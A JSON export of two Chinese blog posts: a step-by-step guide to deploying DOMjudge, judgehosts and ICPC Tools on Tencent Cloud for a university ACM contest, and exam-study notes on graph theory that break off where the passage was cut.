[{"type":"Article","title":"使用Domjudge举办一场ACM比赛","id":"domjudge","createTime":"2025-12-29T02:32:00.000Z","updateTime":"2026-01-01T11:07:23.766Z","content":"\r\n## 1. 前言\r\n\r\n之前的校赛一直在老 OJ 上举行。老 OJ 是好几年前的老学长的毕业设计，功能特别少，页面老旧，并且体验感也特别差，比如排行榜上只能显示队伍编号，不知道编号对应的是谁。更重要的是，评测机速度特别慢，去年的新生赛比赛时竟然有 6 页的 pending，交一发要等十几分钟，所以今年下定决心做出点改变。\r\n\r\n目前正式比赛的 OJ 一般有三种选择：Domjudge，CCPC OJ，Hydro。Hydro 今年刚开始使用，貌似还没有正式对外公布用于比赛的 Hydro 版本。Domjudge 一眼看上去有点复杂，所以最开始选择使用 CCPC OJ。不过 CCPC OJ 的大屏展示、滚榜不是 ICPC Tools，少点感觉，并且 CCPC OJ 不能测交互题，而且中间测试感觉 CCPC OJ 的体验感也不是很好，于是又打算改用 Domjudge。\r\n\r\n## 2. 服务器\r\n\r\n虽然作为 985（甚至还有一个超算中心），但学校的服务器配置都很低，难以作为评测机。于是考虑直接在网上买公网服务器。最开始考虑的是阿里云，但是有文章说[^1] 可能阿里云的服务器会出现问题，于是又考虑使用腾讯云的服务器。\r\n\r\n直接包月买肯定买不起了，而且也没必要，我们可以按量付费。我买的是计算型 C6 （ C6.LARGE8）这个服务器。腾讯云的可用地区里貌似离湖南最近的地区就是广州了，于是地域选的是广州。然后把硬盘容量调成最低（20GB），镜像用的 Ubuntu，公网流量也按量付费，把带宽上限拉到最大（200Mbps）：\r\n\r\n![配置清单](https://api.file.caiwen.work/picture/2025/12/29/image-20251229111023348.png)\r\n\r\n这样下来一小时只有 0.75，感觉还可以接受。\r\n\r\n后面我在服务器上安装了一个宝塔面板，然后在宝塔面板里又安装了一个 Docker，随后部分都是以 Docker 容器的形式部署的。\r\n\r\n前期在准备比赛的时候可能会时不时用一下服务器上传或者更新的功能，但总的来说用的比较少。服务器不用的时候可以选择关机不收费（其实硬盘的费用还是要收的，不过没那么多就是了）。服务器每次启动的时候 IP 可能会变，可以考虑开通一个弹性公网 IP（这个只有没有绑定服务器才会收费，服务器处于关机状态的话应该是不收费的）\r\n\r\n## 3. Domjudge\r\n\r\n### 3.1 部署\r\n\r\nDomjudge 的配置过程比我想象中简单不少。首先部署数据库：\r\n\r\n```sh\r\ndocker run --restart=always -d -it --name dj-mariadb \\\r\n-e MYSQL_ROOT_PASSWORD=domjudge114514 \\\r\n-e MYSQL_USER=domjudge \\\r\n-e CONTAINER_TIMEZONE=Asia/Shanghai \\\r\n-e MYSQL_PASSWORD=domjudge114514 \\\r\n-e MYSQL_DATABASE=domjudge -p 3306:3306 \\\r\nmariadb  --max-connections=1000 --max-allowed-packet=102400000 --innodb-log-file-size=202400000\r\n```\r\n\r\n- `max-connections` 设为 1000，确保能够顺利进行数据库连接\r\n- `max-allowed-packet` 的单位是 B，一般设为最大测试点的两倍\r\n- `innodb-log-file-size` 的单位是 B，一般设为最大测试点的十倍\r\n- 由于我们使用 Docker 进行部署，所以上述的参数最好在开始就想好，后面再改动的话就会非常麻烦\r\n\r\n然后部署 Domjudge：\r\n\r\n```sh\r\ndocker run --restart=always --link dj-mariadb:mariadb -d -it \\\r\n-e MYSQL_HOST=mariadb \\\r\n-e MYSQL_USER=domjudge \\\r\n-e MYSQL_DATABASE=domjudge \\\r\n-e CONTAINER_TIMEZONE=Asia/Shanghai \\\r\n-e MYSQL_PASSWORD=domjudge114514 \\\r\n-e MYSQL_ROOT_PASSWORD=domjudge114514 \\\r\n-p 80:80 --name domserver domjudge/domserver:8.3.1\r\n```\r\n\r\n然后 Domjudge 就顺利跑起来了。\r\n\r\n然后我们还需要执行下面这些命令来获取初始的管理员密码和评测机连接的密钥：\r\n\r\n```sh\r\ndocker exec -it domserver cat /opt/domjudge/domserver/etc/initial_admin_password.secret\r\n# 下面这条命令获取的就是评测机连接的密钥\r\ndocker exec -it domserver cat /opt/domjudge/domserver/etc/restapi.secret\r\n```\r\n\r\n### 3.2 配置\r\n\r\n进入 domjudge 后台，点击 Configuration settings。\r\n\r\n首先在 Scoring 这里，domjudge 中的内存超限可能会返回 RE 的结果，于是打算直接把 MLE 映射成 RE，然后赛前提醒选手这种情况。同时还把输出超限和没有输出给映射到 WA。\r\n\r\n![评测结果映射](https://api.file.caiwen.work/picture/2025/12/29/image-20251229130138414.png)\r\n\r\n然后在 Judging 这里，建议调大 Output limit，因为默认的 Output limit 可能不太大（大概 8MB），且后面导入题目的时候，可能很多题目没有特别去设置 Output limit，如果此时测试点的答案本身就超过了这个 Output limit，就会出现问题。\r\n\r\n在 Clarifications 这里可以提前设置一下快捷回复。\r\n\r\n在 Display 这里，首先关闭 Show flags，打开 Show affiliations 和 Show affiliation logos，这样榜单的样子就和区域赛的比较接近了。同时我还将 Show compile 设为 always，以及打开了 Allow team submission download。\r\n\r\n## 4. 评测机\r\n\r\n### 4.1 部署\r\n\r\n首先需要在 `/etc/default/grub` 这个文件中，在 `GRUB_CMDLINE_LINUX_DEFAULT` 那里，将 `quiet cgroup_enable=memory swapaccount=1 systemd.unified_cgroup_hierarchy=0` 追加到后面，然后执行：\r\n\r\n```sh\r\nupdate-grub\r\nreboot\r\n```\r\n\r\n随后服务器将会重启。重启后再执行：\r\n\r\n```sh\r\ndocker run -d --restart=always -it --privileged \\\r\n-v /sys/fs/cgroup:/sys/fs/cgroup:rw \\\r\n--name judgehost-0 \\\r\n--link domserver:domserver \\\r\n-e DAEMON_ID=2 \\\r\n-e JUDGEDAEMON_PASSWORD=rynmkGPP4icVoS8BgIth9AkEeF3icUpY \\\r\n-e CONTAINER_TIMEZONE=Asia/Chendu \\\r\ndomjudge/judgehost:8.3.1\r\n```\r\n\r\n- `--name` 是设置容器名称，可以自行设置，只要不重复就可以\r\n- `JUDGEDAEMON_PASSWORD` 那里写上面获得的评测机连接密钥\r\n- `DAEMON_ID=2` 这里设置评测机在哪个 CPU 核心上执行，这里的数字是从下标 0 开始的。值得注意的是，云服务器的厂商在服务器配置那里写的核心数量大概率是超线程过的。比如我买的服务器是 4 核心的，但其实只有两个物理核心。我们可以执行 `cat /sys/devices/system/cpu/cpu*/topology/thread_siblings_list` 查看哪几个虚拟核心是同属于一个物理核心，然后一个物理核心只绑定一个评测机，确保评测的速度。\r\n\r\n### 4.2 扩容\r\n\r\n考虑到我们是购买公网服务器，所以扩容也是非常方便的。我们可以再买一台服务器（需要和 domjudge 所在的主服务器的地域是一样的），专门用来放评测机。在这台服务器上执行：\r\n\r\n```sh\r\ndocker run -d --restart=always -it --privileged \\\r\n-v /sys/fs/cgroup:/sys/fs/cgroup:rw \\\r\n--name judgehost-0 \\\r\n--network=host \\\r\n-e DAEMON_ID=0 \\\r\n-e JUDGEDAEMON_PASSWORD=rynmkGPP4icVoS8BgIth9AkEeF3icUpY \\\r\n-e DOMSERVER_BASEURL=http://172.16.0.10/ \\\r\n-e CONTAINER_TIMEZONE=Asia/Chendu \\\r\ndomjudge/judgehost:8.3.1\r\n```\r\n\r\n- `DOMSERVER_BASEURL` 这里需要填主服务器的内网 ip\r\n- `--network=host` 让容器可以通过局域网连接到主服务器\r\n\r\n然后我们可以对服务器制作镜像，然后创建一个快速启动模板。赛时需要扩容的话鼠标一点，创建新的服务器就可以了，非常方便。（不过如果要缩容的话不能直接把服务器释放，因为可能释放的时候服务器上的评测机正在跑评测任务，可能会出意外。感觉先在 domjudge 后台禁用掉评测机以后再释放会不会好一点？）\r\n\r\n## 5. 大屏展示\r\n\r\n大屏展示就是区域赛现场会放的倒计时、Judge Queue 之类的。\r\n\r\n### 5.1 CDS\r\n\r\n首先我们需要搞一个叫做 CDS 的东西。本来一开始打算不用 Docker 部署，于是光 Java 版本就搞了半天。成功启动之后又发现页面有问题...总之又改用 Docker 了。\r\n\r\nCDS 的镜像是放在 Github 上的，于是这就有了网络的麻烦。还好南京大学提供了镜像源。我们执行：\r\n\r\n```sh\r\ndocker run \\\r\n    --name cds \\\r\n    -d -it \\\r\n    --network=host \\\r\n    -p 8080:8080 \\\r\n    -p 8443:8443 \\\r\n    -e CCS_URL=http://localhost/api/contests/1 \\\r\n    -e CCS_USER=admin \\\r\n    -e CCS_PASSWORD=admin_password \\\r\n    ghcr.nju.edu.cn/icpctools/cds:2.6.1331\r\n```\r\n\r\n- `CCS_PASSWORD` 要设置成 domjudge 的管理员账号的密码\r\n\r\n- `CCS_URL` 的 `1` 表示的是比赛的 ID，可以在 domjudge 的后台看到\r\n\r\n然后再进入容器中：\r\n\r\n```sh\r\ndocker exec -it cds bash\r\n```\r\n\r\n执行：\r\n\r\n```sh\r\ncat /opt/wlp/usr/servers/cds/config/accounts.yaml\r\n```\r\n\r\n就能看到 CDS 的账号信息，我们需要记录一下 `admin`、`presAdmin` 和 `presentation` 的密码。\r\n\r\n然后执行：\r\n\r\n```sh\r\nvim /opt/wlp/usr/servers/cds/config/cdsConfig.xml\r\n```\r\n\r\n将其中 `ccs` 的 `url` 和 `password` 设为与上面的 `CCS_URL` 和 `CCS_PASSWORD` 一致，然后保存。（`cds` 的镜像里是没有 `vim` 的，需要先自己在容器里安装）\r\n\r\n注意，当服务器关机又重启之后，CDS 这个容器可能不会自动启动，需要自己在后台手动启动一下。\r\n\r\n### 5.2 Presentation Client\r\n\r\n后面需要注意，CDS 和后面要说的 Presentation Client、Presentation Admin、Resolver 这些都属于 ICPC Tools，他们之间的版本要保持一致（而且最好是最新版，不是最新版的话在启动时可能会触发自动更新，比较麻烦）。这些工具是基于 Java 的，所以大屏展示工具和滚榜工具在运行前需要安装 Java，而且 Java 的版本好还要对应好。\r\n\r\n我用的 ICPC Tools 的版本号都是 2.6.1331 的，对应的 Java 版本是 JDK 17。\r\n\r\n首先安装好 Java，然后去 [The ICPC Tools | Home](https://tools.icpc.global/) 这里下载 Presentation Client，这是大屏展示的客户端。下载解压后在对应的目录下执行：\r\n\r\n```cmd\r\nset \"ICPC_FONT=DengXian\" && client.bat https://ip:8443/api/contests/1 presentation password\r\n```\r\n\r\n- ICPC Tools 中除了 CDS 在服务器上跑，其他的都在个人电脑的 Windows 下跑就可以\r\n- 上面这个指令要在 cmd 中运行，不能在 power shell 中运行\r\n- `set \"ICPC_FONT=DengXian\"` 以做到可以显示中文\r\n- `ip` 要替换成 cds 服务器所在的 ip\r\n- `1` 也要替换成对应的比赛 id，和上面 `CCS_URL` 的保持一致\r\n- `password` 要填上面获得到的 cds 的 `presentation` 密码\r\n\r\n然后稍等片刻即可进入大屏展示的界面。\r\n\r\n### 5.3 Presentation Admin\r\n\r\n开始时大屏展示上是只显示 ICPC Tools 的图标的，需要我们自行为其设置页面。\r\n\r\n有两种方法，一种是在 ICPC Tools 的网站中下载 Presentation Admin，然后解压，运行：\r\n\r\n```cmd\r\nset \"ICPC_FONT=DengXian\" && presAdmin.bat https://ip:8443 presAdmin password\r\n```\r\n\r\n- `ip` 要替换成 cds 服务器所在的 ip\r\n\r\n- `password` 要填上面获得到的 cds 的 `presAdmin` 密码\r\n\r\n稍等片刻即可打开大屏展示的后台管理界面，在这个界面中可以设置每个大屏展示客户端显示什么内容。\r\n\r\n另一种方法是直接打开 `https://ip:8443`，可以来到 CDS 面板，点击 `Sign in` ，输入 CDS 的 `admin` 账号和密码，登录，然后就可以在左边菜单中看到 `Presentation Admin`，然后就可以在里面选择对所有的大屏展示设置成某个界面。\r\n\r\n注意，上面提到 `CCS_URL`、`/opt/wlp/usr/servers/cds/config/cdsConfig.xml` 、`Presentation Client` 的命令行中，这些地方都需要填比赛 id，一定要记得在比赛前将这些地方改好。\r\n\r\n## 6. 数据导入\r\n\r\n### 6.1 题目导入\r\n\r\n一般题目是在 Polygon 上出的，然后有现成的工具可以将 Polygon 的题目转换成 domjudge 的题目。直接参考：\r\n\r\n[Polygon2DOMjudge/README.cn.md at master · cn-xcpc-tools/Polygon2DOMjudge](https://github.com/cn-xcpc-tools/Polygon2DOMjudge/blob/master/README.cn.md)\r\n\r\n值得注意的是，需要在 Polygon 上构建 Full Package 而不是 Standard Package，然后下载 Full Package 的 Linux 版本，然后再用这个工具进行转换。转换成 domjudge 的格式之后就可以直接导入 domjudge 中。\r\n\r\n可以在题目的编辑界面下方重新导入题目，这样的话题目将会被更新。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/29/image-20251229132401625.png)\r\n\r\n### 6.2 队伍/账号导入\r\n\r\n首先先在 Domjudge 的后台 Configuration settings -> External systems -> Data source ，将其设为 configuration data external，这样将会在 domjudge 的很多界面中新增 external id 这个字段。\r\n\r\n在 Team Categories 中可以添加队伍种类：\r\n\r\n![添加页面](https://api.file.caiwen.work/picture/2025/12/29/image-20251229131437425.png)\r\n\r\n- External ID 可以自己设置\r\n- 不同 Sortorder 的分类的选手，在排行榜上会显示在不同的区域。不过区域赛中，一般都是打星选手和正是选手混在一个区域的，所以 Sortorder 都可以设为 0\r\n\r\n在 Team Affiliations 中可以添加学校信息：\r\n\r\n![添加界面](https://api.file.caiwen.work/picture/2025/12/29/image-20251229131815305.png)\r\n\r\n- External ID 可以自己设置\r\n- Logo 这里建议在创建的时候不上传（疑似是 domjudge 的 bug，因为只有更新页面上传 logo 才有用，创建页面上传 logo 没用），而是创建完之后再点编辑再上传。可以在 [中国大学矢量校徽大全](https://www.urongda.com/) 这里找到大多数学校的校徽矢量图。\r\n\r\n由于我们本次比赛的学校种类数比较少，所以手动添加即可。如果要批量添加的话可以参考官方文档：[Adding contest data in bulk — DOMjudge 8.3.2/0152847a5 documentation](https://www.domjudge.org/docs/manual/8.3/import.html#importing-team-affiliations)\r\n\r\n接下来导入队伍，我们可以用 python 之类的将报名数据生成一个 json 数组，格式如下：\r\n\r\n```json\r\n[\r\n\t{\r\n\t\t\"id\": \"dup4team001\",\r\n\t\t\"group_ids\": [\"3\"],\r\n\t\t\"name\": \"dup4team001\",\r\n\t\t\"display_name\": \"dup4team001\",\r\n\t\t\"organization_id\": \"3\",\r\n\t\t\"label\": \"\",\r\n\t\t\"members\": \"\",\r\n\t\t\"location.description\": \"\"\r\n\t}\r\n]\r\n```\r\n\r\n- domjudge 后台的 Teams 页面中的 `id` 一列是导入时 domjudge 自己生成的，无法自定义。上面 `id` 字段设置的是 `external ID`\r\n- `group_ids` 设置该队伍的分类。一个队伍可以有多个分类。里面的元素是 Team Categories 的 external ID。\r\n- `name` 和 `display_name` 都表示队伍的名称。虽然官方文档中说 `display_name` 是可选的，但是如果不设置的话，榜单上将不会显示队伍名称。\r\n- `label` 是队伍标签，一般可以填队伍的位置。`location.description` 也表示队伍位置。不过前者基本出现在 domjudge 后台所有显示队伍名称的前面，而后者貌似只会出现在气球分发的页面。\r\n- `members` 的内容其实会显示在队伍描述那里。可以填队伍的成员名称。\r\n- `organization_id`：填队伍对应的 team affiliations 的 external id。\r\n\r\n然后在后台的 Import / export 中导入。\r\n\r\n接下来导入队伍账号。虽然官方文档中账号的导入没说支持 json 格式，但是这篇文章[^2] 提到了 json 格式的导入方法。格式如下：\r\n\r\n```json\r\n[\r\n\t{\r\n\t\t\"id\": \"dup4account001\",\r\n\t\t\"username\": \"dup4account001\",\r\n\t\t\"password\": \"P3xm33imve\",\r\n\t\t\"type\": \"team\",\r\n\t\t\"name\": \"dup4account001\",\r\n\t\t\"team_id\": \"dup4team001\"\r\n\t}\r\n]\r\n```\r\n\r\n- `id` 将会设置账号的 external id\r\n- `username` 和 `password` 设置账号的用户名和密码\r\n- `name` 应该是账号的昵称，感觉直接和用户名保持一致就好\r\n- `team_id` 是账号对应队伍的 external_id\r\n\r\n然后在后台的 Import / export 中导入。\r\n\r\n值得一提的是，使用 json 导入的时候 domjudge 不会对密码的安全性进行检查（比如检查是否大于多少位之类的）\r\n\r\n如果中间导入出了什么问题的话，可以考虑直接发 http 请求来批量操作数据（）\r\n\r\n如果你在将 Data source 设为 configuration data external 之前已经创建了比赛，那么这个比赛是没有设置 external id 的，于是你在操作这个比赛时（编辑/查看榜单之类的）就会出现类似于下图的问题：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/29/image-20251229141330490.png)\r\n\r\n此时我们只需要把 Data source 改为原来的就好了。\r\n\r\n## 7. 滚榜\r\n\r\n需要把比赛结束之后的数据转成 ICPC Tools 的 Resolver 接受的数据。ICPC Tools 中貌似已经有对应的工具，但是不太好用。我使用了这个工具：[Lanly109/icpc-resolver-from-domjudge](https://github.com/Lanly109/icpc-resolver-from-domjudge)\r\n\r\n不过这个工具感觉也不太好使用。我打算后面再专门做一个处理滚榜的工具，所以关于滚榜的内容这里就暂时不讲了......\r\n\r\n## 8. 其他\r\n\r\n赛前如果要在 domjudge 上开测试比赛的话，需要记得后面把测试比赛的 public 和 enable 都给关了。同时如果赛前开了些测试账号和队伍，也需要把这些账号和队伍 enable 给关了，并放入 jury 或者其他什么分类中（不然上面的滚榜工具还会把测试队伍给导入进去）。目前还有个问题是，如果不删除测试账号/队伍的话，那么大屏展示显示排行榜的时候还会显示。\r\n\r\n由于是使用公网 IP，所以赛后需要检查一下选手登录的 IP，防止有人赛时提前离场然后在考场外面继续答题。\r\n\r\n同时由于是使用腾讯云的按量付费服务器，赛后需要把服务器释放掉，不然一直扣费。释放前可能还需要把选手的提交记录什么的都给存档下来。\r\n\r\n上面两个我自己写了一个工具：[caiwen666/domjudge-tools](https://github.com/caiwen666/domjudge-tools)，后面还会继续更新。\r\n\r\n[^1]: [计算机 · DOMjudge Docker 配置 - 知乎](https://zhuanlan.zhihu.com/p/258024151)\r\n\r\n[^2]: [DOMjudge Team Account Import Guide - Dup4's Blog](https://dup4.com/blog/2022/5/domjudge-team-account-import-guide/)\r\n\n","summary":"本文介绍了使用Domjudge部署在线评测系统的过程，包括服务器选择、Domjudge配置、评测机部署、大屏展示设置以及数据导入等关键步骤。","key":["domjudge","腾讯云","acm","icpc","评测机"],"tags":[],"path":["记录","使用Domjudge举办一场ACM比赛.md"],"background":"https://api.file.caiwen.work/picture/2026/01/01/632b47f6580e87bcd976d84a260de3e5.png","recommend":false,"status":"published"},{"type":"Article","title":"408数据结构-图论","id":"408-graph","createTime":"2025-12-23T13:52:00.000Z","updateTime":"2026-01-01T11:15:34.758Z","content":"\r\n## 1. 基本概念\r\n\r\n- 图 $G$ 由顶点集 $V$ 和边集 $E$ 组成，记为 $G = \\left(V,E\\right)$\r\n\r\n- $V(G)$ 表示 $G$ 中顶点的有限**非空**集（线性表可以是空表，树可以是空树，图不能是空图，顶点集必须是非空的），$|V|$ 表示图中的顶点数。\r\n- $E(G)$ 表示 $G$ 中顶点之间的关系/边集合（边集可以为空），$|E|$ 表示图中的边数。\r\n\r\n**简单图/多重图**\r\n\r\n如果图满足：\r\n\r\n1. 不存在重复边\r\n2. 不存在顶点到自身的边\r\n\r\n则称为简单图，反之则称为多重图\r\n\r\n**子图**\r\n\r\n如果有两个图 $G = \\left(V,E\\right)$ 和 $G' = \\left(V', E'\\right)$ ，若 $V' \\subset V$ 且 $E' \\subset E$，则称 $G'$ 为 $G$ 的子图。\r\n\r\n若满足 $V(G') = V(G)$，则 $G'$ 为 $G$ 的生成子图。\r\n\r\n注意，并非 $V$ 和 $E$ 的任何子集都能构成 $G$ 的子图，比如 $E$ 中的边涉及到的边的点没有在 $V$ 中。\r\n\r\n**权/网**\r\n\r\n一个图中，每条边都可以标上具有某种含义的数值，表示边的**权值**，边上有权值的图为**带权图/网**。\r\n\r\n**稠密图/稀疏图**\r\n\r\n边数很少的图叫做**稀疏图**，反之叫做**稠密图**。稀疏和稠密是模糊的概念，并且是相对而言的。一般来说，满足 $|E| < |V| \\log |V|$ 的图叫做稀疏图。\r\n\r\n**路径**\r\n\r\n顶点 $v_p$ 到顶点 $v_q$ 之间的**路径**指的是一个顶点序列。关联的边也可以理解为路径的构成要素。\r\n\r\n![不同教材的定义可能不同，关联的边也可以理解为路径的构成要素](https://api.file.caiwen.work/picture/2025/12/24/image-20251224183247786.png)\r\n\r\n路径上的边的数目称为**路径长度**。\r\n\r\n第一个顶点和最后一个顶点相同的路径称为**回路/环**。如果一个图有 $n$ 个顶点，且有大于 $n-1$ 条边，则该图一定存在环。\r\n\r\n**简单路径、简单回路**\r\n\r\n在路径序列中，顶点不重复出现的路径称为**简单路径**。\r\n\r\n除了第一个顶点和最后一个顶点外，其余顶点不重复出现的回路称为**简单回路**。\r\n\r\n**距离**\r\n\r\n从顶点 $u$ 出发到顶点 $v$ 的最短路径如果存在，那么这个路径的长度就称为 $u$ 到 $v$ 的**距离**。\r\n\r\n如果 $u$ 到 $v$ 不存在路径，那么距离记为无穷 $\\infin$。\r\n\r\n### 1.1 有向图\r\n\r\n- 有向边也称为**弧**，记为 $\\left<v,w\\right>$\r\n  - $v$ 称为**弧尾**，$w$ 称为**弧头**\r\n  - $\\left<v,w\\right>$ 称为从 $v$ 到 $w$ 的**弧**，也称 $v$ **邻接到** $w$\r\n\r\n**完全图**\r\n\r\n对于有向图，$|E|$ 取值范围为 $[0,n(n-1)]$，有 $n(n-1)$ 条弧的有向图称为有向完全图。有向完全图中任意两个顶点之间都存在方向相反的两条弧。\r\n\r\n**强连通**\r\n\r\n- **强连通**：若 $v$ 到 $w$ 和 $w$ 到 $v$ 都有路径存在，则 $v$ 和 $w$ 是强连通的。\r\n- **强连通图**：如果图中任意两个点都是强连通的，则称图是强连通图。\r\n- **强连通分量/极大强连通子图**\r\n\r\n**度**\r\n\r\n点 $v$ 有**出度**和**入度**，出度是以点 $v$ 为起点的有向边数目，记为 $OD(v)$。入度是以点 $v$ 为终点的有向边数目，记为 $ID(v)$。点 $v$ 的**度**等于其入度和出度之和，即 $TD(v) = ID(v) + OD(v)$。\r\n\r\n有向图满足 $\\sum ID(v_i) = \\sum OD(v_i) = |E|$。\r\n\r\n**有向树**\r\n\r\n一个顶点的入度为 $0$，其余顶点的入度均为 $1$ 的有向图，称为**有向树**。\r\n\r\n### 1.2 无向图\r\n\r\n- 无向边简称为**边**，记为 $(v,w)$\r\n  - $w$ 和 $v$ 互为**邻接点**\r\n  - $(v,w)$ **依附于** $w$ 和 $v$\r\n  - $(v,w)$ 和 $v$，$w$ 相关联\r\n\r\n**完全图**\r\n\r\n对于无向图，$|E|$ 取值为 $[0,\\frac{n(n-1)}{2}]$，有 $\\frac{n(n-1)}{2}$ 条边的无向图称为无向完全图。无向完全图中任意两个顶点之间都存在边。\r\n\r\n**连通**\r\n\r\n- **连通**：若 $v$ 到 $w$ 有路径存在，则 $v$ 和 $w$ 是连通的。\r\n- **连通图/非连通图**：如果图中任意两个点都是连通的，则称图是连通图，反之则成为非联通图。\r\n- **连通分量/极大连通子图**：相当于图中的连通块。\r\n\r\n（无向图中讨论连通性，在有向图中讨论强连通性）\r\n\r\n**生成树/生成森林**\r\n\r\n连通图中，包含全部顶点，的**极小连通子图**。如果图中点数有 $n$，则生成树有 $n-1$ 条边。\r\n\r\n在非连通图中，每一个连通分量的生成树构成了整个非连通图的生成森林。\r\n\r\n**度**\r\n\r\n无向图中，点 $v$ 的度是依附于点 $v$ 的边的条数，记为 $TD(v)$。\r\n\r\n$\\sum TD(v_i) = 2|E|$。\r\n\r\n## 2. 图的存储\r\n\r\n### 2.1 邻接矩阵法\r\n\r\n对于非带权图：\r\n\r\n$$\r\nA_{i,j} =\r\n\\begin{cases}\r\n1, & \\left(v_i, v_j\\right) \\text{ 或 } \\left<v_i, v_j\\right> \\text{ 是 } E(G) \\text { 中的边 } \\\\\r\n0, & \\left(v_i, v_j\\right) \\text{ 或 } \\left<v_i, v_j\\right> \\text{ 不是 } E(G) \\text { 中的边 }\r\n\\end{cases}\r\n$$\r\n\r\n对于带权图：\r\n\r\n$$\r\nA_{i,j} =\r\n\\begin{cases}\r\nw_{i,j}, & \\left(v_i, v_j\\right) \\text{ 或 } \\left<v_i, v_j\\right> \\text{ 是 } E(G) \\text { 中的边 } \\\\\r\n0 \\text{ 或 } \\infin, & \\left(v_i, v_j\\right) \\text{ 或 } \\left<v_i, v_j\\right> \\text{ 不是 } E(G) \\text { 中的边 }\r\n\\end{cases}\r\n$$\r\n\r\n注意第二个点：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224202842394.png)\r\n\r\n无向图的邻接矩阵是对称矩阵，这是充要的，如果一个邻接矩阵不是对称的那么必然是有向图：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224202802627.png)\r\n\r\n邻接矩阵表示图一定是唯一的。\r\n\r\n对于无向图，第 $i$ 行或者第 $j$ 列非 $0$ 或是 $\\infin$ 元素个数正好是点 $TD(v_i)$。\r\n\r\n对于有向图，第 $i$ 行非 $0$ 或是 $\\infin$ 元素个数正好是 $OD(v_i)$，第 $i$ 列非 $0$ 或是 $\\infin$ 元素个数正好是 $ID(v_i)$。\r\n\r\n枚举的时候需要注意枚举顺序，枚举行的话相当于是对列进行求和：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224203921922.png)\r\n\r\n稠密图适合用邻接矩阵。\r\n\r\n设图的邻接矩阵为 $A$，那么 $A^n$ 的元素 $A^n_{i,j}$ 表示从 $i$ 到 $j$ 长度恰好为 $n$ 的路径数目。\r\n\r\n### 2.2 邻接表法\r\n\r\n邻接表有两个东西，一个是**顶点表**一个是**边表**，表中节点分别是**顶点表结点**和**边表结点**，其中顶点表结点包含**顶点域**和**边表头指针**，边表结点包含**邻接点域**和**指针域**：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204232768.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204302663.png)\r\n\r\n对于无向图，空间复杂度为 $O(|V| + 2|E|)$。对于有向图，空间复杂度为 $O(|V| + |E|)$。\r\n\r\n邻接表法时候存储稀疏图。\r\n\r\n### 2.3 十字链表\r\n\r\n十字链表专门用于存储有向图，有两个部分：**弧结点**和**顶点结点**。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204520964.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204546434.png)\r\n\r\n$firstout$ 去跟连出去的边，$firstin$ 去跟连进来的边。\r\n\r\n$tailvex$ 和 $headvex$ 构成了一个边。\r\n\r\n$tlink$ 连接弧尾相同的边，相当于邻接表法的表示。$hlink$ 连接弧头相同的边。\r\n\r\n### 2.4 邻接多重表\r\n\r\n邻接多重表专门用于无向图，也有两部分：**边结点**和**顶点结点**。\r\n\r\n![边结点](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204946507.png)\r\n\r\n![顶点结点](https://api.file.caiwen.work/picture/2025/12/24/image-20251224204956502.png)\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/24/image-20251224205021571.png)\r\n\r\n总的来说还是类似于邻接表，相比于十字链表少维护了 $firstin$ （而对于无向图也没必要维护这个），然后边之间依然是头相同的连接在一块，尾相同的也连接在一块。\r\n\r\n## 3. 图的遍历\r\n\r\n图的遍历要对图中所有的**点**访问一次，且**仅访问一次**。\r\n\r\n使用邻接表存储时，DFS 和 BFS 的时间复杂度均为 $O(|V|+|E|)$。使用邻接矩阵存储时，DFS 和 BFS 的时间复杂度均为 $O(|V|^2)$。\r\n\r\n**广度优先生成树/森林**：根据 BFS 的顺序构建出来的树/森林\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/26/image-20251226215225382.png)\r\n\r\n**深度优先搜索树/森林**：根据 DFS 的顺序构建出来的树/森林\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/26/image-20251226215320999.png)\r\n\r\n**DFS和BFS序列**就是 DFS 和 BFS 到每个点的顺序。值得注意的是，遍历必须遵循规则，比如 DFS 必须往前走不了了才能回溯，BFS 必须遍历完同层并且按上一层的遍历顺序继续展开下一层。\r\n\r\n![DFS 必须往前走不了了才能回溯](https://api.file.caiwen.work/picture/2025/12/26/image-20251226215733862.png)\r\n\r\n对同样的一个图，基于邻接矩阵的遍历得到的 DFS 和 BFS 序是唯一的，基于邻接表的遍历得到的是不唯一的，因为邻接表存储顺序和边的输入次序有关。但是如果邻接表是给定的，那么遍历顺序就固定了：\r\n\r\n![由于给出了具体的邻接表，所以从一个点出发先遍历谁是确定的](https://api.file.caiwen.work/picture/2025/12/26/image-20251226220059270.png)\r\n\r\n## 4. 图的应用\r\n\r\n### 4.1 最小生成树\r\n\r\n若图 $G$ 存在权值相同的边，则 $G$ 的最小生成树可能不唯一。当图 $G$ 中的各边权值互不相等时，$G$ 的最小生成树是唯一的。\r\n\r\n最小生成树中所有边的权值之和最小，但不能保证任意两个顶点之间和路径是最短路径。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231131929199.png)\r\n\r\n#### 4.1.1 Prim\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231140552570.png)\r\n\r\n将当前所有的结点分成两部分：已经被选入的和未被选入的。然后每次将未被选入的点选入，选择已经被选入的点距离最近的那个未被选入的点。\r\n\r\n时间复杂度 $O(|V|^2)$，不依赖 $|E|$，因此比较适合求边稠密的图的最小生成树。\r\n\r\n#### 4.1.2 Kruskal\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231141025070.png)\r\n\r\n将所有边的边权从小到大排序，然后逐个选择。如果要选择的边的两端点已经在同一个连通块内了，则跳过，选下一个。\r\n\r\n时间复杂度是 $O(|E|\\log_2|E|)$，不依赖于 $O(|V|)$，因此 Kruskal 算法适用于边稀疏而顶点多的图。\r\n\r\n### 4.2 最短路\r\n\r\n如果一个图有负环（换上各个边的权值相加为负数），那么这个图上的最短路是没有定义的。\r\n\r\n#### 4.2.1 Dijkstra\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/31/image-20251231141416372.png)\r\n\r\n类似 